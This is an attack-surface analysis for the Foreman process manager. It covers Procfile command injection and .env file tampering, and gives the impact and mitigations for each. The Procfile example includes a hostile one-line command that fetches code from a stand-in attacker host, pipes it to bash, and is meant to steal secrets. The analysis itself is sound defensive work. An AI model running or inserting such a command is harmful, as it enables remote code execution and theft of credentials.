# Attack Surface Analysis for ddollar/foreman

## Attack Surface: [Procfile Command Injection](./attack_surfaces/procfile_command_injection.md)

**Description:** An attacker can inject malicious commands into the `Procfile` that Foreman will execute.

**How Foreman Contributes:** Foreman directly parses and executes the commands specified in the `Procfile`. It doesn't inherently sanitize or validate these commands.

**Example:** An attacker with write access to the `Procfile` modifies a process definition to include `&& curl attacker.com/steal_secrets | bash`. When Foreman restarts the process, this malicious command will be executed.

**Impact:** Full system compromise, data exfiltration, denial of service, installation of malware.

**Risk Severity:** Critical

**Mitigation Strategies:**

*   Implement strict access controls on the `Procfile` to prevent unauthorized modifications.
*   Employ code reviews for any changes to the `Procfile`.
*   Use infrastructure as code (IaC) practices to manage and version control the `Procfile`, making unauthorized changes easier to detect.
*   Consider using a configuration management system that provides more robust security features.

## Attack Surface: [Environment Variable Manipulation via `.env` File](./attack_surfaces/environment_variable_manipulation_via___env__file.md)

**Description:** An attacker can modify the `.env` file, which Foreman uses to set environment variables for the application processes.

**How Foreman Contributes:** Foreman reads and applies the environment variables defined in the `.env` file to the processes it manages.

**Example:** An attacker modifies the `.env` file to change database credentials, API keys, or other sensitive configuration values. When Foreman restarts the application, it will use these compromised credentials.

**Impact:** Unauthorized access to sensitive resources, data breaches, application malfunction, privilege escalation.

**Risk Severity:** High

**Mitigation Strategies:**

*   Implement strict access controls on the `.env` file.
*   Avoid storing highly sensitive secrets directly in the `.env` file. Consider using secure secret management solutions (e.g., HashiCorp Vault, AWS Secrets Manager).
*   Encrypt the `.env` file at rest if it contains sensitive information.
*   Regularly audit the contents of the `.env` file.
